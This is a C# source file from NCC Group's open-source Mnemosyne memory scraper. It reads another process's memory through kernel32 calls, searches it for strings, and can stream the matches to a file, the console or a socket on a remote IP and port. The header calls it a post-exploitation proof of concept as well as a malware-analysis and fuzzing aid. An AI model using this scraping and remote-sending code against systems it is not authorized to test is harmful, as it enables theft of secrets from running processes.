/*
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Matt Lewis, matt dot lewis at nccgroup dot trust

https://github.com/nccgroup/mnemosyne

Released under AGPL see LICENSE for more information

Mnemosyne - A Memory Scraper

Written by Matt Lewis, NCC Group 2017
Synopsis - scans a process memory space for a search string (unicode and ascii)
then if found, spits these out either to stdout, a file or a socket to a remote listener

Useful for memory scraping a process, a post-exploitation POC, an analysis mechanism for malware  or 
an instrumentation tool to be used during fuzzing

Code adapted from http://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
Original code licensed under CPOL: http://www.codeproject.com/info/cpol10.aspx
*/

using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using MemoryScanner.Resources;

namespace MemoryScanner
{
    internal class ProgObj
    {
        // REQUIRED CONSTS
        internal const int ProcessQueryInformation = 0x0400;

        internal const int MemCommit = 0x00001000;
        internal const int PageReadwrite = 0x04;
        internal const int ProcessWmRead = 0x0010;

        internal const string ArgSocket = "socket";
        internal const string ArgFile = "file";
        private const string ArgStandardInputOutput = "stdio";

        // REQUIRED METHODS
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        internal static extern void GetSystemInfo(out SystemInfo lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer, uint dwLength);

        // REQUIRED STRUCTS
        public struct MemoryBasicInformation
        {
            public int BaseAddress;
            public int AllocationBase;
            public int AllocationProtect;
            public int RegionSize;
            public int State;
            public int Protect;
            public int LType;
        }

        public struct SystemInfo
        {
            public ushort ProcessorArchitecture;
/*
            ushort _reserved;
*/
            public uint PageSize;
            public IntPtr MinimumApplicationAddress;
            public IntPtr MaximumApplicationAddress;
            public IntPtr ActiveProcessorMask;
            public uint NumberOfProcessors;
            public uint ProcessorType;
            public uint AllocationGranularity;
            public ushort ProcessorLevel;
            public ushort ProcessorRevision;
        }


        // main method
        private static int Main(string[] args)
        {
            if (args.Length == 0)
            {
                DisplayUsageText();
                return 0;
            }

            // display process list
            if (args[0].Equals("-proclist"))
            {
                Console.WriteLine("\nPID\tProcess Name");
                Console.WriteLine("---------------------");
                foreach (Process p in Process.GetProcesses())
                {
                    Console.WriteLine(p.Id + "\t" + p.ProcessName);
                }
                return 0;
            }

            CliArgs myargs = new CliArgs();

            if (args[0].Equals("-run") && args.Length >= 5)
            {
                if (args[1].Equals("-s")) SetModeToSocket(args, myargs);
                if (args[1].Equals("-f")) SetModeToFile(args, myargs);
                if (args[1].Equals("-o")) SetModeToStandardIo(args, myargs);
            }

            // Validate arguments, if good then off we go!
            if (myargs.IsArgumentValid())
                MemScan.ScanMemory(myargs);
            else
                Console.WriteLine(ErrorStrings.ArgumentError);

            return 1;
        }

        private static void SetModeToStandardIo(string[] args, CliArgs myargs)
        {
            if (args.Length < 5) return;

            myargs.SetMode(ArgStandardInputOutput);
            myargs.SetPid(args[2]);
            myargs.SetDelay(args[3]);
            myargs.SetPrePostFix(args[4]);
            myargs.DefineSearchTerm(args, 5);
            Console.WriteLine(MessageStrings.SearchStartMessageForStandardIO, myargs.Searchterm, myargs.Delay, myargs.Prepostfix);
        }

        private static void SetModeToFile(string[] args, CliArgs myargs)
        {
            if (args.Length < 6) return;

            myargs.SetMode(ArgFile);
            myargs.SetPid(args[2]);
            myargs.SetFilename(args[3]);
            myargs.SetDelay(args[4]);
            myargs.SetPrePostFix(args[5]);
            myargs.DefineSearchTerm(args, 6);
            Console.WriteLine(MessageStrings.SearchStartMessageForFile, myargs.Searchterm, myargs.Filename, myargs.Delay,myargs.Prepostfix);
        }

        private static void SetModeToSocket(string[] args, CliArgs myargs)
        {
            if (args.Length < 8) return;

            myargs.SetMode(ArgSocket);
            myargs.SetPid(args[2]);
            myargs.SetIPaddr(args[3]);
            myargs.SetPortnum(args[4]);
            myargs.SetDelay(args[5]);
            myargs.SetPrePostFix(args[6]);
            myargs.DefineSearchTerm(args, 7);
            Console.WriteLine(MessageStrings.SearchStartMessageForSocket, myargs.Searchterm, myargs.Ipaddr, myargs.Portnum,myargs.Delay, myargs.Prepostfix);
        }

        // Display banner and usage guide.
        public static void DisplayUsageText()
        {
            Console.WriteLine(Resource.Banner);
        }

        // Send string to specified output. Accepted modes: ArgSocket, ArgFile and ArgStandardInputOutput.
        public static void OutputString(string mode, string outputstr, int delay, Socket s, System.IO.StreamWriter file)
        {
            if (mode.Equals(ArgSocket))
            {
                byte[] msg = Encoding.ASCII.GetBytes(outputstr);
                int bytesSent = s.Send(msg);
            }

            if (mode.Equals(ArgFile))
                file.WriteLine(outputstr);

            if (mode.Equals(ArgStandardInputOutput))
                Console.WriteLine(outputstr);
            
            // enter sandman
            System.Threading.Thread.Sleep(delay);
        }
    }
}